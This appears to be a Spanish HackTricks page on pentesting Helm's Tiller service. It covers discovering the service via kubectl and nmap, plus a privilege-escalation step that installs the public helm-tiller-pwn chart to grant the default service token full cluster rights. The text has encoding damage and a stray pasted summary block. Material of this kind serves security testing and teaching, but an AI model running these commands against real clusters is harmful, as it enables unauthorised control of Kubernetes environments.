<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue**me en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Informaci贸n B谩sica

Helm es el **gestor de paquetes** para Kubernetes. Permite empaquetar archivos YAML y distribuirlos en repositorios p煤blicos y privados. Estos paquetes se llaman **Helm Charts**. **Tiller** es el **servicio** que **se ejecuta** por defecto en el puerto 44134 ofreciendo el servicio.

**Puerto predeterminado:** 44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# Enumeraci贸n

Si puedes **enumerar pods y/o servicios** de diferentes espacios de nombres, enum茅ralos y busca aquellos con **"tiller" en su nombre**:
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
```markdown
# Pentesting Tiller (Helm)

## Resumen

Tiller es el componente del servidor de Helm, el gestor de paquetes de Kubernetes. Hasta la versi贸n 2, Tiller se ejecutaba con altos privilegios dentro de un cl煤ster de Kubernetes y pod铆a ser una superficie de ataque si no se configuraba correctamente.

## Descubrimiento

Para descubrir si un cl煤ster de Kubernetes est谩 ejecutando Tiller, se puede buscar el servicio en el puerto 44134 utilizando herramientas como `nmap`.

## Explotaci贸n

Un atacante puede explotar Tiller mal configurado para instalar, actualizar o eliminar charts de Helm, lo que podr铆a resultar en la ejecuci贸n de c贸digo arbitrario o la filtraci贸n de informaci贸n sensible.

## Mitigaci贸n

Para mitigar este riesgo, se recomienda actualizar a Helm 3, que no utiliza Tiller, o asegurarse de que Tiller est茅 configurado con pol铆ticas de acceso adecuadas y se ejecute en un namespace aislado.

## Herramientas de Pentesting

- `nmap`
- `helm`
```
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
Tambi茅n podr铆as intentar encontrar este servicio en ejecuci贸n comprobando el puerto 44134:
```bash
sudo nmap -sS -p 44134 <IP>
```
Una vez que lo hayas descubierto, puedes comunicarte con 茅l descargando la aplicaci贸n cliente de helm. Puedes usar herramientas como `homebrew`, o consultar [**la p谩gina oficial de lanzamientos**](https://github.com/helm/helm/releases)**.** Para m谩s detalles, o para otras opciones, consulta [la gu铆a de instalaci贸n](https://v2.helm.sh/docs/using_helm/#installing-helm).

Luego, puedes **enumerar el servicio**:
```
helm --host tiller-deploy.kube-system:44134 version
```
## Escalaci贸n de Privilegios

Por defecto, **Helm2** se instalaba en el **namespace kube-system** con **privilegios elevados**, as铆 que si encuentras el servicio y tienes acceso a 茅l, esto podr铆a permitirte **escalar privilegios**.

Todo lo que necesitas hacer es instalar un paquete como este: [**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn) que dar谩 al **token de servicio predeterminado acceso a todo en el cluster completo.**
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
En [http://rui0.cn/archives/1573](http://rui0.cn/archives/1573) tienes la **explicaci贸n del ataque**, pero b谩sicamente, si lees los archivos [**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml) y [**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml) dentro de _helm-tiller-pwn/pwnchart/templates/_ puedes ver c贸mo **se est谩n otorgando todos los privilegios al token predeterminado**.


<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
